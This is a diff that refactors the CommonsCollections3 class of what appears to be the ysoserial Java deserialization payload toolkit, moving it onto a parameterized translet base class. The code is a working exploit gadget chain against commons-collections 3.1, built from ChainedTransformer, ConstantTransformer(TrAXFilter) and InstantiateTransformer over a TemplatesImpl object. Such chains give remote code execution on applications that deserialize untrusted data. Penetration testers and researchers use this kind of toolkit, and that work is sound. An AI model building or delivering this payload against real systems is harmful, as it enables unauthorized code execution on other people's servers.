@@ -30,11 +30,10 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({ Authors.FROHOFF })
-public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<Object> {
+public class CommonsCollections3 extends ParameterizedTransletObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		Object templatesImpl = Gadgets.createTemplatesImpl(command);
-
+	@Override
+	protected Object getObject(Object templates) throws Exception {
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 			new Transformer[]{ new ConstantTransformer(1) });
@@ -43,7 +42,7 @@ public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<
 				new ConstantTransformer(TrAXFilter.class),
 				new InstantiateTransformer(
 						new Class[] { Templates.class },
-						new Object[] { templatesImpl } )};
+						new Object[] { templates } )};
 
 		final Map innerMap = new HashMap();
 
@@ -63,6 +62,7 @@ public class CommonsCollections3 extends PayloadRunner implements ObjectPayload<
 	}
 
 	public static boolean isApplicableJavaVersion() {
-        return JavaVersion.isAnnInvHUniversalMethodImpl();
-    }
+		return JavaVersion.isAnnInvHUniversalMethodImpl();
+	}
+
 }
